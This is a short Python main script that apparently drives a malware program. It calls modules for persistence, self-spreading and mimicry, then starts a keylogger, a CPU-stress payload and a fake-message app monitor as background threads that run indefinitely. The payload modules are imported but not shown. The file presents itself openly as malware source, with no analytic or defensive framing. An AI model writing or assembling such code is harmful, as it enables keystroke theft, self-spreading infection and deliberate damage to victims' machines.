import threading
import time
from persistence import startup
from spreader import spreader
from mimic import mimic
from payloads.keylogger import starter as keylogger_starter
from payloads.cpu_stress import cpu_stress
from payloads.fake_msg import monitor_apps
def main():
    startup()
    spreader()
    mimic()
    threading.Thread(target=keylogger_starter,daemon=True).start()
    threading.Thread(target=cpu_stress,daemon=True).start()
    threading.Thread(target=monitor_apps,daemon=True).start()
    while True:
        time.sleep(1)  # Keep the main thread alive to allow daemon threads to run
if __name__ == "__main__":
    main()